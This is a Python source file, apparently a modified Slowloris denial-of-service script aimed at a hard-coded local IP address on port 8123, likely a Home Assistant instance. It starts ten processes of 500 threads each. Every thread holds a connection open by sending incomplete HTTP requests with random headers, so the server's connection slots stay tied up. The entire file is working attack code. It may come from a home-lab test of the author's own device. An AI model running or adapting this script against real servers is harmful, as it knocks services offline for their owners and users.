'''
	Author: Long Nguyen
	Decription: Modification of Slowloris.py from https://github.com/gkbrk/slowloris
'''

import socket
from threading import Thread
from multiprocessing import Process
import time
import random
HOST = "192.168.1.137"
PORT = 8123


def send_header(s, name, value):
    s.send(f"{name}: {value}".encode())

def send_line(s, line):
    line = f"{line}\r\n"
    s.send(line.encode("utf-8"))

def connect_to_ha():
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((HOST, PORT))
			while True:
				try:
					send_line(s, f"GET /?{random.randint(0, 2000)} HTTP/1.1")
					send_header(s, "X-a", random.randint(1, 5000))
					#print("sent to server")
					time.sleep(1)
				except Exception or TimeoutError:
					print("exception occured")
					s.close()
					pass
		except TimeoutError:
			s.close()
			pass
		
	
def slowloris():
	for i in range(500):
		Thread(target = connect_to_ha).start()
		
def main():
	for i in range(10):
		Process(target = slowloris).start()
		
if __name__ == "__main__":
	main()
